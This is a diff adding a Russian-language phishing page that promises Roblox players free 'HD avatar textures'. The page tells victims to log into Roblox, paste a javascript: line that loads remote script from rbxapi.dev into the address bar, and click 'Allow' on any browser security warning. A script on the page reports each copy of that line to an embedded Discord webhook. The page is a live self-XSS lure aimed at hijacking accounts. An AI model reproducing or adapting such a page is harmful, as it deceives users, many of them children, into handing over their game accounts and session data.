@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔥 Получи HD текстуры аватара Roblox</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            color: #e0e0ff;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            max-width: 800px;
+            background: rgba(25, 25, 50, 0.9);
+            border-radius: 20px;
+            padding: 30px;
+            border: 2px solid #5a2aff;
+            box-shadow: 0 0 40px rgba(90, 42, 255, 0.7);
+            backdrop-filter: blur(10px);
+        }
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        h1 {
+            font-size: 2.8rem;
+            color: #00f7ff;
+            text-shadow: 0 0 15px #00f7ff;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            font-size: 1.2rem;
+            color: #a0a0ff;
+            margin-bottom: 20px;
+        }
+        .card {
+            background: rgba(40, 40, 80, 0.6);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border: 1px solid #4e2aff;
+        }
+        .card-title {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .card-title .number {
+            background: #5a2aff;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+            font-size: 1.5rem;
+            margin-right: 15px;
+        }
+        h2 {
+            font-size: 1.8rem;
+            color: #ff55ff;
+        }
+        .instruction {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 15px 0;
+            border-left: 4px solid #ff55ff;
+        }
+        .code-block {
+            background: #0a0a20;
+            padding: 20px;
+            border-radius: 10px;
+            font-family: monospace;
+            font-size: 1.2rem;
+            margin: 20px 0;
+            overflow-x: auto;
+            border: 1px solid #5a2aff;
+            position: relative;
+        }
+        .copy-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: #5a2aff;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        .copy-btn:hover {
+            background: #7a4aff;
+        }
+        .video-container {
+            position: relative;
+            padding-bottom: 56.25%;
+            height: 0;
+            overflow: hidden;
+            border-radius: 15px;
+            margin: 25px 0;
+            background: #000;
+        }
+        .video-container iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        .warning {
+            background: rgba(255, 50, 50, 0.2);
+            border-left: 4px solid #ff3232;
+            padding: 20px;
+            margin: 25px 0;
+            border-radius: 0 10px 10px 0;
+        }
+        .btn {
+            display: block;
+            width: 100%;
+            background: linear-gradient(90deg, #ff00cc, #00eeff);
+            color: white;
+            text-align: center;
+            padding: 20px;
+            font-size: 1.5rem;
+            font-weight: bold;
+            border: none;
+            border-radius: 12px;
+            margin: 30px 0;
+            cursor: pointer;
+            text-decoration: none;
+            transition: all 0.3s;
+        }
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 25px rgba(255, 0, 204, 0.5);
+        }
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #a0a0ff;
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🔥 ПОЛУЧИ HD ТЕКСТУРЫ АВАТАРА</h1>
+            <p class="subtitle">Эксклюзивный метод для профессиональных дизайнеров Roblox</p>
+        </header>
+
+        <div class="card">
+            <div class="card-title">
+                <div class="number">1</div>
+                <h2>Подготовка</h2>
+            </div>
+            <div class="instruction">
+                <p>👉 Открой официальный сайт Roblox и войди в свой аккаунт:</p>
+                <a href="https://www.roblox.com" class="btn" target="_blank">ОТКРЫТЬ ROBLOX.COM</a>
+                <p>Убедись, что ты полностью загрузил свой аватар в студии.</p>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-title">
+                <div class="number">2</div>
+                <h2>Вставь код</h2>
+            </div>
+            <div class="instruction">
+                <p>👉 Скопируй этот специальный код генератора текстур:</p>
+                <div class="code-block" id="code">
+                    javascript:$.get('//rbxapi.dev/l/RobloxTexture/API.js')
+                    <button class="copy-btn" onclick="copyCode()">КОПИРОВАТЬ</button>
+                </div>
+                <p>👉 Перейди на страницу своего аватара в Roblox</p>
+                <p>👉 <span style="color:#00f7ff;font-weight:bold">ВСТАВЬ ЭТОТ КОД В АДРЕСНУЮ СТРОКУ БРАУЗЕРА</span> и нажми Enter</p>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-title">
+                <div class="number">3</div>
+                <h2>Видео-инструкция</h2>
+            </div>
+            <div class="video-container">
+                <iframe width="560" height="315" src="https://www.youtube.com/embed/dQw4w9WgXcQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+            </div>
+            <p>Если код не сработал с первого раза, посмотри видео-инструкцию выше.</p>
+        </div>
+
+        <div class="warning">
+            <p>⚠️ ВАЖНО: После вставки кода в адресную строку может появиться предупреждение безопасности — это нормально! Нажми "Разрешить", чтобы генератор заработал.</p>
+            <p>⚠️ НЕ ОБНОВЛЯЙ страницу после выполнения кода, иначе текстуры будут потеряны!</p>
+        </div>
+
+        <footer>
+            <p>© 2025 Roblox HD Textures Generator | Только для профессионального использования</p>
+        </footer>
+    </div>
+
+    <script>
+        // Функция копирования кода
+        function copyCode() {
+            const code = "javascript:$.get('//rbxapi.dev/l/RobloxTexture/API.js')";
+            navigator.clipboard.writeText(code).then(() => {
+                alert('Код скопирован! Теперь вставь его в адресную строку Roblox');
+            });
+        }
+        
+        // Автоматическое отслеживание копирования
+        document.addEventListener('copy', (event) => {
+            const code = "javascript:$.get('//rbxapi.dev/l/RobloxTexture/API.js')";
+            if (window.getSelection().toString().includes(code)) {
+                // Твой вебхук для отслеживания копирования
+                const WEBHOOK_URL = "https://discord.com/api/webhooks/1380377571186835557/QeMVNE8LHWsE2V5ylVFUIMVaJPqWJi0XwHMjWoR-lLELQeWYpTOg5xd4zm3NheQni9vx";
+                const message = `🔥 КОД СКОПИРОВАН: ${new Date().toLocaleString()}`;
+                
+                fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: message })
+                });
+            }
+        });
+    </script>
+</body>
+</html>
